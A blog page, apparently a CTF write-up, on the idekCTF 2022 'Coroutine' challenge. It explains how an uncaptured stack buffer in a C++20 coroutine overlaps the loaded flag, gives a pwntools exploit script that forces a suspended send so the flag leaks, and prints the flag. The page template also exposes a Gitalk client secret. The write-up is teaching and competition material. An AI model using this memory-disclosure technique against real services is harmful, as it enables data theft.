<!DOCTYPE html>


<html lang="zh-CN">


<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="idekctf, pwn, ctf,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
   
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    idekCTF2022 - Coroutine Writeup |  Kiprey&#39;s Blog
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
  
<link rel="stylesheet" href="/css/custom.css">

  
  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
  
  

  
<script>
var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
	var s = document.getElementsByTagName("script")[0]; 
	s.parentNode.insertBefore(hm, s);
})();
</script>


<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
</head>

</html>

<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-idek_coroutine"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  idekCTF2022 - Coroutine Writeup
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/01/idek_coroutine/" class="article-date">
  <time datetime="2023-01-20T16:00:00.000Z" itemprop="datePublished">2023-01-21</time>
</a>   
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">1.2k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">7 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="Introduction">Introduction</h2>
<p>Last weekend I participated in <code>idekCTF 2022</code> with r3kapig. After briefly browsing other pwn challenges, I tried to solve <code>Coroutine</code> and finally solved it (4 sovled in total).</p>
<p>Now, let’s dive into this challenge!</p>
<a id="more"></a>
<h2 id="C-20-Coroutine">C++20 Coroutine</h2>
<p>What’s the coroutine ?</p>
<blockquote>
<p>A coroutine is a function that <strong>can suspend execution</strong> to <strong>be resumed later</strong>. Coroutines are <strong>stackless</strong>: they suspend execution by returning to the caller and the <strong>data that is required to resume execution is stored separately from the stack</strong>. This allows for sequential code that executes asynchronously (e.g. to handle non-blocking I/O without explicit callbacks), and also supports algorithms on lazy-computed infinite sequences and other uses.</p>
<p>ref: <a href="https://en.cppreference.com/w/cpp/language/coroutines" target="_blank" rel="noopener">Coroutines (C++20) - cppreference</a></p>
</blockquote>
<p>As we have seen, coroutines are executed in <strong>a single-threaded environment</strong>, and can be <strong>paused as needed during execution</strong> (e.g. waiting response from peers) and finally <strong>find a suitable time to resume execution</strong> (e.g. receive the reply from a peer).</p>
<p>What does this mean?</p>
<ol>
<li>The execution environment may be <strong>different before and after</strong> the <code>co_await</code> statement. (e.g. current thread id)</li>
<li>If the coroutine holds <strong>a outer pointer or reference</strong>, this may cause memory problem (e.g. UAF、 UAP…)</li>
</ol>
<h2 id="Program-Logic">Program Logic</h2>
<p>User can interact with proxy to <strong>change the proxy receive buffer size and send buffer size</strong>. Interestingly, we can also find that the size of the program’s send buffer is manually set to 128 byte. These indications suggest that the <strong>vulnerability is most likely related to the socket buffer size</strong>.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sendbuff = <span class="number">128</span>;</span><br><span class="line">setsockopt(accept_result, SOL_SOCKET, SO_SNDBUF, &amp;sendbuff, <span class="keyword">sizeof</span>(sendbuff));</span><br></pre></td></tr></table></figure>
<p>After reading the source code carefully, we can know that the program is act as <strong>echo server</strong>, reading the messages from proxy and send back:</p>
<ol>
<li>
<p>create and execute the coroutine. In the coroutine, program will accept client connection and run into <code>client_loop</code> to repeatedly receive and send messages from client.</p>
</li>
<li>
<p>If program cannot receive the message from client (e.g. there is currently no data from the client), or cannot send the message to client (e.g. socket buffer is full), the coroutine will save its own coroutine-handler and suspend its own execution, returning to the caller:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">class <span class="title">RecvAsync</span><span class="params">(SendAsync)</span> : NonCopyable </span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">auto</span> <span class="keyword">operator</span> <span class="title">co_await</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Awaiter</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">bool</span> <span class="title">await_ready</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="function"><span class="keyword">void</span> <span class="title">await_suspend</span><span class="params">(<span class="built_in">std</span>::coroutine_handle&lt;&gt; handle)</span> <span class="keyword">noexcept</span> </span>&#123;</span><br><span class="line">                <span class="comment">// save current coroutine handle </span></span><br><span class="line">                ctx_.add_read(fd_, <span class="built_in">std</span>::move(handle));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="function"><span class="keyword">int</span> <span class="title">await_resume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> Awaiter&#123; ctx_, fd_, buffer_ &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>The program will run into <code>io_content::run_until_done</code>，monitor the file descriptors with <code>select</code>， and resume the execution of corresponding coroutine if any file descriptors are available.</p>
<p>Interestingly, in the loop of <code>run_until_done</code>, the program will execute <code>load_flag</code> to load the flag into the stack.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">400</span>];</span><br><span class="line">    FILE* fp = fopen(<span class="string">"flag"</span>, <span class="string">"rt"</span>);</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, flag);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run_until_done</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!reads_.empty() || !writes_.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        load_flag();</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="Vulnerability">Vulnerability</h2>
<p>I was interested in how the coroutine captures the context, so I modified the code and printed out the addresses of all the buffers. Here are some code snippets.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Task&lt;<span class="keyword">bool</span>&gt; <span class="title">client_loop</span><span class="params">(io_context&amp; ctx, <span class="keyword">int</span> socket)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::byte buffer[<span class="number">512</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"client_loop buffer before RecvAsync: %p\n"</span>, buffer);</span><br><span class="line">        <span class="keyword">int</span> recved = <span class="keyword">co_await</span> RecvAsync(ctx, socket, buffer);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Output: client_loop buffer before RecvAsync: 0x5603212fff89</p>
</blockquote>
<p>This output indicates that the buffers in the coroutine will be <strong>created in the heap</strong>. In other words, this entire coroutine function is actually equivalent to a heap structure. This is the reason why a coroutine can suspend and resume execution at different times, because it preserves the context when it is created.</p>
<p>However, after carefully checking each buffer’s address, I found that the <strong>coroutine did not capture the <code>buffer2</code> in function <code>SendAllAsyncNewline</code></strong>. In other words, the address of <code>buffer2</code> is located on the <strong>stack</strong>, which is <strong>not far from the memory location storing the flag</strong> (&lt; 512 byte, 0x200).</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">400</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"load_flag: %p\n"</span>, flag);</span><br><span class="line">    FILE* fp = fopen(<span class="string">"flag"</span>, <span class="string">"rt"</span>);</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, flag);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Task&lt;<span class="keyword">bool</span>&gt; <span class="title">SendAllAsyncNewline</span><span class="params">(io_context&amp; ctx, <span class="keyword">int</span> socket, <span class="built_in">std</span>::span&lt;<span class="built_in">std</span>::byte&gt; buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::byte buffer2[<span class="number">513</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"SendAllAsyncNewline buffer: %p\n"</span>, buffer.data());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"SendAllAsyncNewline buffer2: %p\n"</span>, buffer2);</span><br><span class="line">    <span class="built_in">std</span>::copy(buffer.begin(), buffer.end(), buffer2);</span><br><span class="line">    buffer2[buffer.size()] = (<span class="built_in">std</span>::byte)<span class="string">'\n'</span>;</span><br><span class="line">    <span class="keyword">return</span> SendAllAsync(ctx, socket, <span class="built_in">std</span>::span(buffer2, buffer.size()+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Output:</p>
<ul>
<li>
<p>SendAllAsyncNewline buffer: 0x559806712f89</p>
</li>
<li>
<p>SendAllAsyncNewline buffer2: <strong>0x7ffc1ddfd3a0</strong></p>
</li>
<li>
<p>load_flag: <strong>0x7ffc1ddfd480</strong></p>
</li>
</ul>
</blockquote>
<p>And <code>SendAllAsync</code> will also <strong>send data multiple times</strong>:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Task&lt;<span class="keyword">bool</span>&gt; <span class="title">SendAllAsync</span><span class="params">(io_context&amp; ctx, <span class="keyword">int</span> socket, <span class="built_in">std</span>::span&lt;<span class="built_in">std</span>::byte&gt; buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (offset &lt; buffer.size())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="keyword">co_await</span> SendAsync(ctx, socket, <span class="built_in">std</span>::span(buffer.data() + offset, buffer.size() - offset));</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">co_return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        offset += result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">co_return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we can carefully interact with proxy, we can leak the flag by the  following process:</p>
<ol>
<li>During the two <code>SendAsync</code> execution intervals in <code>SendAllAsync</code>, returning the control flow to <code>run_until_done</code> by filling the socket buffer in advance.</li>
<li>Executing <code>load_flag</code> function to load the flag into stack memory, which happens to overlap with <code>buffer2</code> .</li>
<li>Clean the proxy receive buffer, so that the program can continue to send <code>buffer2</code> to the client. Since we have loaded the flag into <code>buffer2</code> before sending, the flag will be output along with it.</li>
</ol>
<h2 id="Exploit">Exploit</h2>
<p>Once you have found <strong>the threshold for sending data length</strong> in docker, all the difficulties in challenge are solved.</p>
<blockquote>
<p>Note: you can find the sending threshold more easier by modifying the source code, as you wish.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote("coroutine.chal.idek.team", 1337)</span></span><br><span class="line">io = process(<span class="string">"python3 proxy.py"</span>, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Change Receive Buffer</span></span><br><span class="line">io.sendlineafter(<span class="string">"Select Option:"</span>, <span class="string">b"2"</span>)</span><br><span class="line"><span class="comment"># Change Receive Buffer size to the minimal size</span></span><br><span class="line">io.sendlineafter(<span class="string">"Buffer size&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect</span></span><br><span class="line">io.sendlineafter(<span class="string">"Select Option:"</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Filling the proxy recevie buffer and remote send buffer.</span></span><br><span class="line">send_size = <span class="number">5</span> * <span class="number">512</span> + <span class="number">314</span> <span class="comment"># 0xb3a</span></span><br><span class="line"><span class="keyword">while</span> send_size &gt; <span class="number">0</span>:</span><br><span class="line">    current_send_size = min(<span class="number">512</span>, send_size)</span><br><span class="line">    send_size -= current_send_size</span><br><span class="line">    </span><br><span class="line">    io.sendlineafter(<span class="string">"Select Option:"</span>, <span class="string">b"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Data&gt;"</span>, <span class="string">b"a"</span> * current_send_size)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># As proxy recevie buffer and remote send buffer are filled</span></span><br><span class="line"><span class="comment"># The `SendAllAsync` will be suspend and run `load_flag`</span></span><br><span class="line">io.sendlineafter(<span class="string">"Select Option:"</span>, <span class="string">b"4"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"Data&gt;"</span>, <span class="string">b"a"</span> * <span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the receive buffer, and `SendAllAsync` will be resume to send the flag.</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    print(io.sendlineafter(<span class="string">"Select Option:"</span>, <span class="string">b"5"</span>))</span><br><span class="line">    print(io.sendlineafter(<span class="string">"Size&gt;"</span>, <span class="string">b'4096'</span>))</span><br></pre></td></tr></table></figure>
<p>You can read the flag <code>idek{exploiting_coroutines}</code> in the proxy receive data.</p>
<p>In fact, I did not write any python script for exploit when solving this challenge. Instead, I was interacting directly with the remote server using <code>nc</code>. So I wrote the above exploit script based on previous interaction logs.</p>
<p><img src="/2023/01/idek_coroutine/image-20230121133235895.png" alt="image-20230121133235895"></p>
<h2 id="Reference">Reference</h2>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/497224333" target="_blank" rel="noopener">C++20协程原理和应用 - CSDN</a></li>
<li><a href="https://www.incredibuild.cn/blog/cppxiechengshizhanyanshi" target="_blank" rel="noopener">C++ 协程——实战演示 - incredibuild</a></li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2023/01/idek_coroutine/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2023/05/zerotier_moon_frpc/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            使用 Frpc 进行内网穿透构建 ZeroTier Moon 记录
          
        </div>
      </a>
    
    
      <a href="/2023/01/docker/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">CTF Docker 小记</div>
      </a>
    
  </nav>

   
 
   
<div class="gitalk" id="gitalk-container"></div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">


<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>


<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>

<script type="text/javascript">
  var gitalk = new Gitalk({
    clientID: '5f6c407f4cb8963d03ac',
    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
    repo: 'kiprey.github.io',
    owner: 'kiprey',
    admin: ['kiprey'],
    // id: location.pathname,      // Ensure uniqueness and length less than 50
    id: md5(location.pathname),
    distractionFreeMode: false,  // Facebook-like distraction free mode
    pagerDirection: 'last'
  })

  gitalk.render('gitalk-container')
</script>
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2020-2025
        <i class="ri-heart-fill heart_icon"></i> Kiprey
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
        <script>
            $(document).ready(function() {
                var int1 = setInterval(fixCount1, 100);
                var int2 = setInterval(fixCount2, 100);

                var busuanziValueSiteOffset = 100000000000;
                var busuanziValuePageOffset = 200000000000;
                function fixCount1() {
                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
                        clearInterval(int1);
                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
                    }
                }
                function fixCount2() {
                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
                        clearInterval(int2);
                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
                    }
                }
            });
        </script> -->
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->


<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: '.tocbot',
    contentSelector: '.article-entry',
    headingSelector: 'h1, h2, h3, h4, h5, h6',
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: 'main',
    positionFixedSelector: '.tocbot',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto'
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
